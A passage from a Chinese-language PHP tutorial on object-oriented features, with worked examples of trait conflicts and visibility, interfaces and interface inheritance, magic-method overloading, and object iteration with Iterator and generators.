错误，没有该类</code></pre><p>4、trait是用来将公共代码提供给其他类使用的，而类要使用trait的前提是加载对应的trait</p><pre><code>trait Eat{    public function show(){        echo &apos;eat&apos;;    }}# 类中加载traitclass Human{    # 加载：使用use关键字    use Eat;                # use就表示将trait Eat中的所有东西拿到了当前类Human中}# 使用trait中的内容$h = new Human();$h-&gt;show();                    # eat：Human类自己没有show方法，但是因为使用了trait Eat，所以可用</code></pre><p>5、一个类可以使用多个trait</p><pre><code>trait t1{    public function eat(){        echo &apos;eat&apos;;    }}trait t1{    public function sleep(){        echo &apos;sleep&apos;;    }}class Human{    # 使用多个trait    use t1,t2;    public function show(){        $this-&gt;eat();        $this-&gt;sleep();    }}$h = new Human();$h-&gt;show();                        # eat sleep</code></pre><blockquote><p>小结</p></blockquote><p>1、trait是用来解决有公共需求但是不属于同一类型里的代码复用问题（解决php单一继承问题）</p><ul><li>为了让面向对象的继承更加纯粹（符合继承关系）</li><li>为了让代码的复用性变得更加强大</li></ul><h3 id="2、trait同名"><a href="#2、trait同名" class="headerlink" title="2、trait同名"></a>2、trait同名</h3><blockquote><p>目标：掌握trait同名的处理逻辑，掌握同名的处理方式</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>trait同名</strong>：一个类中可能需要引入多个trait，而不同trait中可能出现同名</p><ul><li><p>trait同名分为两类</p><ul><li><p>属性同名：不允许出现同名属性，不管是多个trait还是类内部出现同名属性（除非同名同值）</p></li><li><p>方法同名</p><ul><li>不允许同名出现，使用替代方法：确定要用的那个</li></ul><p>use trait名1,trait名2…{</p><pre><code>trait名1::方法名 insteadof trait名2;</code></pre><p>}</p></li><li><p>不允许同名出现，使用别名，让两个都可以用（使用别名前需要先替代）</p><p>use trait名1,trait名2…{<br>   trait名2::方法名 insteadof trait名1;        # trait1::方法名无用<br>   trait名1::方法名 as 别名;                   # trait1::方法可用（别名使用）<br>}</p></li></ul></li></ul><blockquote><p>步骤</p></blockquote><p>1、定义多个trait，里面存着同名方法</p><p>2、在某个类中引入多个trait</p><p>3、同名冲突后</p><ul><li>使用insteadof明确需要用的那个</li><li>使用别名临时修改同名中的一个</li></ul><blockquote><p>示例</p></blockquote><p>1、trait同名属性必须同值，否则报错</p><pre><code>trait t1{    public $name = true;    public $age = 0;}trait t2{    public $name = true;    public $age = 1;}                                # 此时上述没问题，没被引入类，所以不冲突class Human{    use t1,t2;                    # 致命错误：age冲突（name同名但同值没问题）}</code></pre><p>2、如果同时引入的多个trait中有同名方法，那么会产生冲突</p><pre><code>trait t1{    public function eat(){        echo &apos;t1,eat&apos;;    }}trait t2{    public function eat(){        echo &apos;t2,eat&apos;;    }}class Human{    use t1,t2;                # 错误：eat()方法冲突}</code></pre><p>3、解决冲突的方法1：使用insteadof代替处理：明确使用具体哪个trait的方法</p><pre><code># 解决方案：明确替代class Person{    use t1,t2{                    # 花括号        t2::eat insteadof t1;    # t2的eat代替t1的eat    }}$p = new Person();$p-&gt;eat();                        # t2,eat</code></pre><p>4、解决冲突的方法2：使用别名处理：保证两个方法都能使用</p><pre><code># 解决方案：别名处理class Person{    use t1,t2{                    # 花括号        t1::eat insteadof t2;    # 明确使用t1的eat方法        t2::eat as show;        # t2的eat变成show    }}$p = new Person();$p-&gt;eat();                        # t1,eat$p-&gt;show();                        # t2,eat</code></pre><blockquote><p>小结</p></blockquote><p>1、trait同名概率出现较小，但是要警惕出现同名</p><p>2、trait同名处理</p><ul><li>属性不允许同名，只能改成不同的名字</li><li>方法可以进行同名处理<ul><li>只需要用到其中一个：使用insteadof代替，明确使用一个（另外一个失效）</li><li>需要用到两个：使用别名改变名字使用（使用别名前也要先明确使用哪个，别名另外一个即可）</li></ul></li></ul><p>3、如果出现同名，那么要考虑选择什么样的方式来解决</p><h3 id="3、trait控制权"><a href="#3、trait控制权" class="headerlink" title="3、trait控制权"></a>3、trait控制权</h3><blockquote><p>目标：了解trait在进行别名时控制权的规定（访问修饰限定符）</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>trait控制权</strong>：trait在引入类后，可以根据实际类的需求修改trait中对应方法的控制权（只针对当前引入类）</p><ul><li><p>trait可以通过as关键字直接修改权限</p><p>trait trait名字{</p><pre><code>protected function 方法名(){}</code></pre><p>}</p><p>class 类名{</p><pre><code>use trait名字{    方法名 as 访问修饰限定符;}</code></pre><p>}</p></li><li><p>trait中允许通过修改方法的别名来实现权限的改变</p><p>trait trait名字{</p><pre><code>protected function 方法名(){}</code></pre><p>}</p><p>class 类名{</p><pre><code>use trait名字{    方法名 as 限访问修饰限定符 别名;    # 注意，虽然用了别名，原名依然可用}</code></pre><p>}</p></li></ul><blockquote><p>步骤</p></blockquote><p>1、定义trait并设定方法</p><p>2、定义类引入trait</p><p>3、如果必要：修改权限</p><ul><li>直接修改</li><li>使用别名</li></ul><blockquote><p>示例</p></blockquote><p>1、直接修改权限：将trait里的方法改成其他级别控制</p><pre><code>trait t1{    public function sleep(){        echo &apos;t1:sleep&apos;;    }}class Human{    use t1{        sleep as private;    }    public function show(){        $this-&gt;sleep();    }}$h = new Human();$h-&gt;show();                            # 输出：t1:sleep$h-&gt;sleep();                        # 错误：不可访问</code></pre><p>2、通过别名修改权限：本质只限定了别名，没有改变原来的方式</p><pre><code>trait t1{    public function sleep(){        echo &apos;t1:sleep&apos;;    }}class Human{    use t1{        sleep as private s;    }    public function show(){        $this-&gt;sleep();        $this-&gt;s();                    # 都可以访问    }}$h = new Human();$h-&gt;show();                            # 输出：t1:sleep$h-&gt;sleep();                        # 输出：t1:sleep$h-&gt;s();                            # 错误：不可访问</code></pre><blockquote><p>小结</p></blockquote><p>1、trait提供的方法，可以在被类引入后根据实际的需求修改控制权</p><p>2、别名修饰修改控制权只会修改别名方法本身，不影响原trait方法自身的控制权</p><h3 id="4、trait优先级"><a href="#4、trait优先级" class="headerlink" title="4、trait优先级"></a>4、trait优先级</h3><blockquote><p>目标：了解trait在继承中的使用和关系</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>trait优先级</strong>：trait在引入的过程中可能存在类本身或者父类拥有同名的成员</p><ul><li>trait同名属性必须保证同名同值，否则报错</li><li>trait同名方法系统认定为重写，优先级关系为：子类 &gt; trait &gt; 父类<ul><li>如果子类、trait和父类都有同名方法：子类中使用parent也只能访问到父类</li></ul></li></ul><blockquote><p>示例</p></blockquote><p>1、继承覆盖问题：如果类中在使用trait的同时，也是继承自父类，而trait中与父类中有同名方法，那么trait中将覆盖父类同名方法</p><pre><code>trait Eat{    public function eat(){        echo &apos;Eat::eat&apos;;    }}class Human{    public function eat(){        echo &apos;Human::eat&apos;;    }}# 子类继承父类同时使用traitclass Man extends Human{    use Eat;}$m = new Man();$m-&gt;eat();                        # 输出：Eat::eat</code></pre><p>2、在trait和父类同时存在同名方法下，如果要访问父类方法，可以在trait同名方法中使用parent关键字访问父类同名方法</p><pre><code>trait Eat{    public function eat(){        # 使用父类方法        parent::eat();        echo &apos;Eat::eat&apos;;    }}</code></pre><p>3、如果子类、trait和父类中同时存在同名方法：那么子类访问自身的，使用parent访问父类的，trait的被覆盖无法被访问到（除非别名）</p><pre><code>trait Eat{    public function eat(){        echo &apos;Eat::eat&apos;;    }}class Human{    public function eat(){        echo &apos;Human::eat&apos;;    }}# 子类继承父类同时使用traitclass Man extends Human{    use Eat;    # 重写方法    public function eat(){        parent::eat();            # Human::eat        echo &apos;Man::eat&apos;;    }}$m = new Man();$m-&gt;eat;                                # Human::eat Man::eat</code></pre><blockquote><p>小结</p></blockquote><p>1、trait在引入过程中，有可能参与到类的继承中去，如果存在同名方法，就变成了覆盖（重写）</p><p>2、重写的方法想要访问父类方法，需要使用parent关键字</p><ul><li>trait要访问父类：使用parent（在trait中同名方法里使用）</li><li>子类要访问父类：使用parent（在子类同名方法中使用）</li></ul><p>3、一般子不会出现子类、trait和父类同时拥有同名方法的可能性（引入trait没有任何含义），如果有也会针对trait使用别名处理</p><h3 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h3><p>1、trait是一种类似class结构关键字，trait不能被实例化，可以拥有所有类成员结构（类常量除外）</p><p>2、trait是用来实现代码复用的，为其他类提供公共代码（方法），其他类如果使用trait用use关键字引入</p><p>3、在类中use具体trait就相当于将trait内的所有代码在类中写了一遍</p><p>4、一个类可以使用多个trait，但是要注意同名问题</p><ul><li>同名方法可以使用insteadof来实现替代：一个trait中的同名方法替代另外一个，类就访问替代的那个</li><li>同名方法可以在被替代之后使用as制作方法别名：类就可以拥有两个方法</li></ul><p>5、类中在引入trait后，要注意与trait中的同名成员问题</p><ul><li>同名属性：不予许（除非同名同值）</li><li>同名方法：允许，类中的方法会覆盖trait中的方法</li></ul><p>6、如果类在使用trait的同时也继承了其他类，那么trait中出现的同名方法会覆盖基类的同名方</p><p>7、类在使用trait时可以修改trait方法的控制级别：更严或者更宽松都可以</p><ul><li>直接修改：[trait名::]方法名 as 访问修饰限定符;（会让引入类只有一个方法名，这种应用较多）</li><li>通过别名：[trait名::]方法名 as 访问修饰限定符 别名;（会让引入类有两个方法：一个是trait本身方法（不会被修改），一个是别名（最终修改的权限）</li></ul><p>8、trait中可以使用抽象方法，那么使用该trait的类就必须本身为抽象类或者将抽象方法实现</p><pre><code>trait t{    abstract public function eat();}# 抽象类abstract class Human{    use t;}# 实现类class Animal{    use t;    # 实现t中的抽象方法       public function eat(){}}</code></pre><p>9、trait使用机制</p><ul><li>有公共代码要实现（方法），而这些方法可能在很多类中会用到</li><li>公共代码不是属于某一类事务特有，而是很多事务都有（不符合继承）</li></ul><h2 id="四、-接口Interface"><a href="#四、-接口Interface" class="headerlink" title="四、 接口Interface"></a><strong>四、 接口Interface</strong></h2><blockquote><p>学习目标：理解接口的概念，掌握接口在大型项目中的价值和应用</p></blockquote><ul><li>接口概念</li><li>接口成员</li><li>接口继承</li></ul><h3 id="1、接口"><a href="#1、接口" class="headerlink" title="1、接口"></a>1、接口</h3><blockquote><p>目标：理解接口概念，掌握接口的价值和定义方式</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>接口</strong>：interface，与类<strong>类似</strong>，专门用来规范一些共性类必须实现的方法</p><ul><li>接口不是类，但是与类有类似的结构</li><li><p>接口不能实例化，类可以<strong>实现</strong>接口</p><p>interface 接口名字{}<br>class 类名 implements 接口名字{}</p></li><li><p>接口是用来规范项目体系，提供一些必须的行为规范的</p></li></ul><blockquote><p>示例</p></blockquote><p>1、接口定义：使用interface关键字，后跟接口名字（与类结构一样）</p><pre><code>interface Human{}</code></pre><p>2、接口不是类，不可以被实例化</p><pre><code>new Human();                # 致命错误，接口不能被实例化</code></pre><p>3、接口实现：接口是用来规范类必须完成的事情，所以接口只能被类实现：implements</p><pre><code>class Man implements Human{}</code></pre><blockquote><p>小结</p></blockquote><p>1、接口是一个与类相似的结构，目的是为了规范一些类的必要的行为</p><p>2、接口不是类，类只能实现接口</p><p>3、接口会使得项目的开发变得不那么灵活，所以选择性使用接口</p><ul><li>小型项目：接口的增加会导致php的灵活性和快捷性受阻，因此很少使用接口</li><li>大型项目：接口的增加会很好的规范团队的协作，比较多用接口</li></ul><h3 id="2、接口成员"><a href="#2、接口成员" class="headerlink" title="2、接口成员"></a>2、接口成员</h3><blockquote><p>目标：了解接口内部的成员规范，掌握接口的应用</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>接口成员</strong>：接口内部定义的成员</p><ul><li>接口成员只能有两类<ul><li>接口常量：const</li><li>公有的接口方法（普通方法和静态方法）</li></ul></li><li>接口方法为抽象方法：没有方法体（不需要abstract关键字，因为接口方法都是抽象方法）</li><li>实现接口的类<ul><li>可以访问接口常量：接口常量不能被重写</li><li>需要实现所有的接口方法（除非类本身是抽象类）</li><li>接口方法实现不允许增加控制权限（必须为public）</li></ul></li></ul><blockquote><p>示例</p></blockquote><p>1、接口成员：接口中只能定义公有抽象方法和接口常量</p><pre><code>interface Human{    # 接口常量    const NAME = &apos;人&apos;;    # 接口抽象方法    public function eat();    public static function show();    # 错误示例    public function go(){}                # 错误：接口中的方法必须为抽象    public $age;                        # 错误：接口中不能有属性    public static $count = 0;            # 错误：接口中不能有静态属性（成员属性）    protected function walk();            # 错误：接口方法必须为公有抽象方法}</code></pre><p>2、接口成员方法必须被实现的子类实现或者类为抽象类，接口常量可以直接在实现类中使用</p><pre><code>interface Human{   # 接口常量    const NAME = &apos;人&apos;;    # 接口抽象方法    public function eat(); }# 实现接口class Man implements Human{    # 必须实现接口所有抽象方法    public function eat(){        echo self::NAME;                        # 可以访问接口常量    }}# 抽象类实现接口abstract class Ladyboy implements Human{}        # 正常实现</code></pre><p>3、类实现接口的成员，不允许重写接口中的常量，不允许增加接口方法的控制权限</p><pre><code>class Woman implements Human{    # 重写接口常量    const NAME = &apos;女人&apos;;              # 错误：不允许重写接口常量    # 强化接口方法控制    private function eat(){}        # 错误：接口方法不允许使用其他访问修饰限定符，必须使用public}</code></pre><blockquote><p>小结</p></blockquote><p>1、接口成员只有两种：接口常量和公有抽象方法（没有方法体）</p><p>2、类实现接口的时候，必须实现接口中所有的抽象方法（或者抽象类实现）</p><p>3、接口中的成员不能被实现接口的类进行重写（接口常量）和权限更小（受保护或者私有化接口方法）</p><p>4、接口成员（方法）规定了实现接口的类必须实现所有方法，从而从最上层规范整体架构</p><ul><li>大型开发团队中，必要保证类的实现可以让其他类使用成员可知（命名规范）</li><li>核心结构类必须实现接口，并实现接口中规范的方法（结构规范）</li></ul><h3 id="3、接口继承"><a href="#3、接口继承" class="headerlink" title="3、接口继承"></a>3、接口继承</h3><blockquote><p>目标：理解接口的继承体系</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>接口继承</strong>：接口可以被接口继承</p><ul><li>接口继承接口的目的<ul><li>实现接口的成员扩展：丰富接口内容，从而实现更好的对实现类的规范</li><li>为了形成完成的接口体系，让不同级别的类实现不同级别的接口</li></ul></li><li><p>接口可以一次性继承多个接口</p><p>interface A{}<br>interface B{}</p><h1 id="接口继承"><a href="#接口继承" class="headerlink" title="接口继承"></a>接口继承</h1><p>interface C extends A{}</p><h1 id="接口多继承"><a href="#接口多继承" class="headerlink" title="接口多继承"></a>接口多继承</h1><p>interface D extends A,B{}</p></li></ul><blockquote><p>示例</p></blockquote><p>1、数据库设计规范：使用接口</p><ul><li><p>为了规范所有数据库表的操作，设定接口方法：所有的数据库操作都必须使用规定的接口</p><p>interface DB{</p><pre><code>public function insert(string $sql);public function update(string $sql);public function delete(string $sql);public function select(string $sql);</code></pre><p>}</p></li><li><p>考虑到操作的便捷性，需要使用到自动新增、自动查询、自动修改，因此增加一个下级接口，继承原有接口</p><p>interface AutoDB extends DB{</p><pre><code>public function autoInsert(array $data,int $id);public function autoUpdate(array $data,int $id);public function autoSelect(array $condition);</code></pre><p>}</p></li><li><p>封装数据库操作类：实现接口（基础数据库类，实现基础操作）</p><p>class SQL implements DB{</p><pre><code>public function __construct(){    # 初始化数据库连接认证、字符集、数据库选择}public function insert(string $sql){    # 实现新增}public function update(string $sql){    # 实现更新}public function delete(string $sql){    # 实现删除}public function select(string $sql){    # 实现查询}</code></pre><p>}</p></li><li><p>业务数据库操作类：继承数据库操作类SQL并实现便捷业务操作</p><p>class Model extends SQL implements AutoDB{</p><pre><code># 初始化操作已经由SQL完成，只需要实现AutoDB的自动操作public function autoInsert(array $data,int $id){    # 实现自动构造新增SQL指令，调用父类的insert方法实现}public function autoUpdate(array $data,int $id){    # 实现自动构造更新SQL指令，调用父类的update方法实现}public function autoSelect(array $condition){    # 实现自动构造查询SQL指令，调用父类的select方法实现}</code></pre><p>}</p></li></ul><p>2、生物设计规范：使用接口</p><ul><li><p>人类是一类特定生物，设计一个接口</p><p>interface Human{</p><pre><code>public function walk();public function talk();</code></pre><p>}</p></li><li><p>动物是大类特定生物，设计一个接口</p><p>interface Animal{</p><pre><code>public function eat();public function drink();</code></pre><p>}</p></li><li><p>人猿是一类生物既有人类的基本特性又有动物的基本特性：因此继承两个接口</p><p>interface Ape extends Human,Animal{</p><pre><code>public function sleep();</code></pre><p>}</p></li><li><p>实现具体的人猿操作</p><p>class Monkey implements Ape{</p><pre><code>public function walk(){}public function talk(){}public function eat(){}public function drink(){}public function sleep(){}</code></pre><p>}</p></li></ul><blockquote><p>小结</p></blockquote><p>1、接口可以继承接口，而且可以多继承</p><p>2、接口是在更大型的项目中，为了保证底层的实现而设定的规范，通常是抽象类实现接口，增加必要成员，然后让实际业务类去继承抽象类。</p><p>3、类在继承其他类的时候可以同时去实现相应接口，不要求父类与接口有任何关系（可以有关系）</p><h2 id="五、-php重载"><a href="#五、-php重载" class="headerlink" title="五、 php重载"></a><strong>五、 php重载</strong></h2><blockquote><p>学习目标：了解重载的概念和php重载的区别，掌握php重载的作用和应用场景</p></blockquote><ul><li>重载概念</li><li>php属性重载</li><li>php方法重载</li></ul><h3 id="1、重载"><a href="#1、重载" class="headerlink" title="1、重载"></a>1、重载</h3><blockquote><p>目标：了解重载的概念以及php中重载的区别</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>重载</strong>：overload，指在一个类中可以出现多个同名方法，彼此之间的参数个数和类型不一样</p><ul><li><p>重载在强类型语言中，可以灵活的应对不同的需求（参数类型不同）</p></li><li><p>php中不支持同名方法，而且也不区分数据类型（弱类型语言），所以php不支持传统重载</p></li><li><p>php中的重载：当某些不允许操作发生时，会<strong>自动调用</strong>的一种内部机制（相关的魔术方法），来实现错误处理</p><ul><li>属性重载：属性不存在或者权限不够访问的时候自动触发</li><li>方法重载：方法不存在或者权限不够访问的时候自动触发</li></ul></li><li>所有php的重载都需要开发者事先设定好：实现魔术方法</li></ul><blockquote><p>示例</p></blockquote><p>1、重载的概念：以Java语言为例说明</p><pre><code>class Person{    public String drink(String taste){        return &apos;good:&apos; + taste;    }    public Void drink(int number){        System.out.println(&apos;喝了&apos; + number + &apos;口&apos;);    }}# 实例化Person p = new Person();p.drink(&apos;nice&apos;);p.drink(1);</code></pre><p>2、php重载：访问不存在的或者权限不够的类成员（属性、方法）</p><pre><code>class Person{    public $name = &apos;&apos;;    private $age = 0;}$p = new Person();$p-&gt;age++;            # 报错：权限不够（私有不允许类外访问）# php中的重载就是针对上述类似的错误使用时的处理方案</code></pre><blockquote><p>小结</p></blockquote><p>1、普通重载overload是面向对象强类型语言中都可以使用的，根据参数不同（数量、类型）而设计的同名方法，系统会在调用时根据实参选择调用具体的方法</p><p>2、php是弱类型语言，因此不支持传统重载</p><p>3、php中的重载是针对权限不够或者不存在的成员访问时给出的解决方案（容错处理）</p><ul><li>属性重载</li><li>方法重载</li></ul><h3 id="2、php属性重载"><a href="#2、php属性重载" class="headerlink" title="2、php属性重载"></a>2、php属性重载</h3><blockquote><p>目标：了解php属性重载的意义，掌握php重载实现代码的容错性</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>php属性重载</strong>：当对象访问不存在的或者权限不够的属性的时候，自动触发的魔术方法让代码不出错（容错处理）</p><ul><li>属性重载魔术方法<ul><li>__get(属性名)：访问不存在或者权限不够的属性时触发</li><li>__set(属性名,属性值)：设置不存在或者权限不够的属性时触发</li><li>__isset(属性名)：判定不存在或者权限不够的属性时触发</li><li>__unset(属性名)：删除不存在或者权限不够的属性时触发</li></ul></li></ul><blockquote><p>示例</p></blockquote><p>1、魔术方法：指系统为类中预先设计好的，只需要开发者实现的方法，魔术方法以双下划线<code>__</code>开始。对象在某些特定情况下会自动调用的方法。构造方法、析构方法和克隆方法就是魔术方法</p><pre><code>class Man{    public function __construct(){}}new Man();            # 实例化后对象自动调用（触发时机：对象被实例化）</code></pre><p>2、实现属性重载</p><pre><code>class Man{    private $age = 10;    # 读取重载    public function __get($key){        echo $key,__METHOD__,&apos;&lt;br/&gt;&apos;;    }    # 写重载    public function __set($key,$value){        echo $key . &apos; : &apos; . $value . &apos;&lt;br/&gt;&apos;;    }    # 查是否存在重载    public function __isset($key){        echo $key,__METHOD__,&apos;&lt;br/&gt;&apos;    }    # 删除属性重载    public function __unset($key){        echo $key,__METHOD__,&apos;&lt;br/&gt;&apos;;    }}# 实例化$m = new Man();$m-&gt;age;            # 类外访问私有属性：原本不允许$m-&gt;age = 100;        # 设置isset($m-&gt;age);        # 判定unset($m-&gt;age);        # 删除</code></pre><p>3、属性重载的目的：一方面为了不让程序运行出错，另一方面可以在类内部由我们自己控制内容的访问</p><pre><code>class Man{    private $age = 10;    # 读取重载    public function __get($key){        # echo $key,&apos;&lt;br/&gt;&apos;;        # 定义一个允许访问列表：假设有很多私有属性        $allow = array(&apos;age&apos;);        # 判定是否在列表内：在就允许访问，不在就返回NULL或者false        if(in_array($key,$allow)){            return $this-&gt;$key;                # 可变属性：$key是外部访问的目标，最终为$this-&gt;age        }        # 不允许访问        return false;    }    # 写重载（该方法没有返回值）    public function __set($key,$value){        # echo $key . &apos; : &apos; . $value . &apos;&lt;br/&gt;&apos;;        # 与__get理论类似：允许的设置，不允许的不设置（什么都不做即可）            }    # 判定重载    public function __isset($key){        # 给出内部判定结果        return isset($this-&gt;$key);    }    # 对象重载    public function __toString(){        # 返回一个指定字符串（一般是当类有属性保存某些信息时，输出某个属性）        return __METHOD__;        }}</code></pre><blockquote><p>小结</p></blockquote><p>1、php中属性重载是为了保证数据的安全性，不让代码出现一些操作性错误</p><p>2、php重载机制__get()和__set()也可以理解为统一为属性设置访问和设置方法（便捷）</p><p>3、属性重载也能有效保证对象结构，不会让用户无限增加对象属性</p><p>4、一般情况下系统内部使用的类如果不是特殊情况不需要使用到属性重载，如果类是对外提供操作的那么应该增加相应的重载机制以防出错</p><h3 id="3、php方法重载"><a href="#3、php方法重载" class="headerlink" title="3、php方法重载"></a>3、php方法重载</h3><blockquote><p>目标：理解方法重载的原理，掌握方法重载的实现</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>php方法重载</strong>：对象或者类访问不存在或者权限不够的方法时，自动触发的魔术方法让代码不出错（容错处理）</p><ul><li>方法重载魔术方法<ul><li>__call(方法名,方法参数列表)：调用不存在或者权限不够的方法时触发</li><li>__callStatic(方法名,方法参数列表)：调用不存在或者权限不够的静态方法时触发</li></ul></li></ul><blockquote><p>示例</p></blockquote><p>1、方法重载</p><pre><code>class Man{    private function show(){        echo __METHOD__,&apos;&lt;br/&gt;&apos;;    }    private static function staticShow(){        echo __METHOD__,&apos;&lt;br/&gt;&apos;;    }    # 普通方法重载    public function __call($name,$args){        echo $name,__METHOD__,&apos;&lt;br/&gt;&apos;;    }    # 静态方法重载    public static function __callStatic($name,$args){        echo $name,__METHOD__,&apos;&lt;br/&gt;&apos;;    }}# 访问不可访问的方法Man::staticShow();$m = new Man();$m-&gt;show();</code></pre><p>2、方法重载的主要目的：不让外部访问出错。当然，如果必要时也可以进行内部访问</p><pre><code>class Man{    private function show(){        echo __METHOD__,&apos;&lt;br/&gt;&apos;;    }    private static function staticShow(){        echo __METHOD__,&apos;&lt;br/&gt;&apos;;    }    # 方法重载    public function __call($name,$args){        # 允许访问列表        $allow = array(&apos;show&apos;);        # 判定是否在列表中        if(in_array($name,$allow)) return $this-&gt;$name(implode($args,&apos;,&apos;));        # 其他情况        return false;    }    public static function __callStatic($name,$args){        # 不允许访问        return false;    }}</code></pre><blockquote><p>小结</p></blockquote><p>1、php方法重载是用来控制外部对类中方法的错误访问而设定的一种容错处理</p><p>2、php方法重载的本质是实现一种错误的优雅处理</p><h2 id="六、-对象遍历"><a href="#六、-对象遍历" class="headerlink" title="六、 对象遍历"></a><strong>六、 对象遍历</strong></h2><blockquote><p>学习目标：理解对象遍历的概念，掌握Iterator迭代器对遍历的控制，掌握生成器的概念以及对代码的优化</p></blockquote><ul><li>对象遍历</li><li>Iterator迭代器</li><li>Generator生成器</li></ul><h3 id="1、对象遍历"><a href="#1、对象遍历" class="headerlink" title="1、对象遍历"></a>1、对象遍历</h3><blockquote><p>目标：理解对象遍历的概念</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>对象遍历</strong>：将对象中的所有属性以<strong>键值对</strong>的形式取出并进行访问</p><ul><li>对象是一种复合数据类型，对象中真正保存的内容是<strong>属性</strong></li><li>对象的属性本质也是一种键值对关系：名字 = 值</li><li><p>对象遍历就是利用foreach对对象中的属性进行取出解析</p><ul><li>对象遍历遵循访问修饰限定符的限定：即类外只能遍历所有公有属性</li></ul><p>foreach(对象变量 as [属性名变量 =&gt; ] 属性值变量){</p><pre><code># 属性名变量代表取出的每个属性的名字# 属性值变量代表取出的每个属性的值</code></pre><p>}</p></li></ul><blockquote><p>示例</p></blockquote><p>1、使用foreach对对象进行遍历</p><pre><code># 定义类class Man{    public $name = &apos;LiLei&apos;;    public $height = 178;    public $weight = 140;    protected $age = 30;    private $money = 1000;}# 实例化$m = new Man();# 遍历foreach($m as $k =&gt; $v){    echo $k . &apos; : &apos; . $v . &apos;&lt;br/&gt;&apos;;        # $k为属性名，$v为属性值}</code></pre><blockquote><p>小结</p></blockquote><p>1、foreach可以对对象像数组一样遍历</p><p>2、foreach遍历对象遍历的是对象内部的所有公有属性（在类外：受访问修饰限定符的限制）</p><h3 id="2、Iterator迭代器"><a href="#2、Iterator迭代器" class="headerlink" title="2、Iterator迭代器"></a>2、Iterator迭代器</h3><blockquote><p>目标：理解Iterator迭代器与foreach的关系，掌握迭代器的工作原理，实现自主控制迭代器</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>Iterator迭代器</strong>：php内置的一种能够修改foreach内部运行机制的<strong>接口</strong></p><ul><li>Iterator迭代器内置了5个抽象方法，实现迭代器的类必须实现5个抽象方法</li><li>实现了Iterator迭代器的类的对象在进行foreach时，不会按照foreach原来的机制处理，而是调用迭代器的5个方法</li><li>foreach本身的执行步骤<ul><li>① 初始化目标：将对象指针指向第一个属性（执行一次）</li><li>② 判定指针是否有效：判定当前指针指向的元素是否存在，存在下一步，不存在终止（N+1次执行）</li><li>③ 取出当期指针元素下标（属性名）：将当前属性的名字取出来存储到变量（N次执行）</li><li>④ 取出当前指针元素值（属性值）：将当前属性的值取出来存储到变量（N次执行）</li><li>⑤ 将指针指向下一个：将取出元素后的指针指向下一个属性（N次执行）</li></ul></li><li>Iterator迭代器的本质就是改变foreach内部的5个方式，实现开发者的自定义控制</li></ul><blockquote><p>步骤</p></blockquote><p>1、当前类的对象存在遍历需求</p><p>2、当前遍历的方式需要自定义控制</p><p>3、当前类实现Iterator迭代器，并实现对应5个方法</p><p>4、遍历对象</p><blockquote><p>示例</p></blockquote><p>1、简单迭代控制（针对索引数组）</p><pre><code>class Person implements Iterator{    # 属性列表（索引数组    private $properties = [&apos;name&apos;,&apos;age&apos;,&apos;gender&apos;,&apos;height&apos;,&apos;weight&apos;];    # 下标属性    private $key = 0;    # 实现5个方法    public function current(){        # 取出当前数组元素值        return $this-&gt;properties[$this-&gt;key];    }    public function key(){        # 返回当前下标        return $this-&gt;key;    }    public function next(){        # 不需要返回值：当前下标 + 1        $this-&gt;key++;    }    public function rewind(){        # 不需要返回值：重置数组下标        $this-&gt;key = 0;    }    public function valid(){        # 需要返回布尔值：判定下标对应的元素是否存在即可        return isset($this-&gt;properties[$this-&gt;key]);    }}</code></pre><p>2、复杂迭代控制（针对全部数组）</p><pre><code>class Person implements Iterator{    private $info = [        &apos;name&apos;     =&gt; &apos;&apos;,        &apos;age&apos;      =&gt; 0,        &apos;gender&apos;=&gt; &apos;&apos;,        &apos;height&apos;=&gt; 0,        &apos;weight&apos;=&gt; 0    ];    # 实现5个方法    public function current(){        # 返回当前元素当前的值：当前元素是一个数组，那就可以使用数组函数current来处理        return current($this-&gt;info);    }    public function key(){        return key($this-&gt;info);    }    public function next(){        # 当前方法不需要返回值：说明外部调用的时候不会用到返回值        next($this-&gt;info);    }    public function rewind(){        # 也不需要返回值        reset($this-&gt;info);    }    public function valid(){        # 需要返回布尔值：而且没有直接的函数能够判定：可以通过key取出当前指针元素的下标，然后再通过这个下标去判定元素是否存在（因为false不能成为数组元素下标，系统会自动转换成0）        return isset($this-&gt;info[key($this-&gt;info)]);    }}</code></pre><blockquote><p>小结</p></blockquote><p>1、Iterator迭代器是专门针对有遍历对象控制的类的而存在的</p><p>2、迭代器能够有效控制foreach对对象的遍历，从而保护好内部的结构</p><h3 id="3、生成器"><a href="#3、生成器" class="headerlink" title="3、生成器"></a>3、生成器</h3><blockquote><p>目标：了解生成器的作用和语法，掌握生成器对于内存的优化</p></blockquote><blockquote><p>概念</p></blockquote><p><strong>生成器</strong>：Generator，生成器提供了一种更容易的方法来实现简单的对象迭代</p><ul><li>相比较定义类实现 <strong>Iterator</strong> 接口的方式，性能开销和复杂性大大降低</li><li>生成器是一个类Generator实现了Iterator接口，并且实现了Iterator方法（修改了内部逻辑）</li><li><p>生成器是暂<strong>停循环执行逻辑</strong>，等到使用到的时候才触发循环再次执行</p><p>for($i = 0;$i &lt; 10000;$i++){</p><pre><code># 此时循环只执行一次：除非有内容触发循环再次执行（需要$i）循环才会开始下一次yield $i;</code></pre><p>}</p></li><li><p>yield关键字代表暂停代码继续向下执行：直到yield代码被使用（循环遍历）</p></li><li>生成器对象遍历：使用yield后，函数就会返回一个Generator的对象，此时就可以针对对象进行遍历（需要函数对yield进行包装：函数才有返回值）</li></ul><blockquote><p>步骤</p></blockquote><p>1、需要使用大规模数据产生（数组或者对象，一般针对数组）</p><p>2、需要对数据产生后进行遍历</p><p>3、为了节省内存的使用：使用生成器</p><blockquote><p>示例</p></blockquote><p>1、需要产生10000个数据的数组并进行遍历</p><p>传统实现方式：函数+遍历</p><pre><code>function getArr(){    for($i = 0;$i &lt; 10000;$i++){        $arr[] = $i;    }    return $arr;}$arr = getArr();foreach($arr as $v){    echo $v . &apos; &apos;;} </code></pre><p>使用生成器：函数（生成器）+遍历</p><pre><code>function getArr(){    for($i = 0;$i &lt; 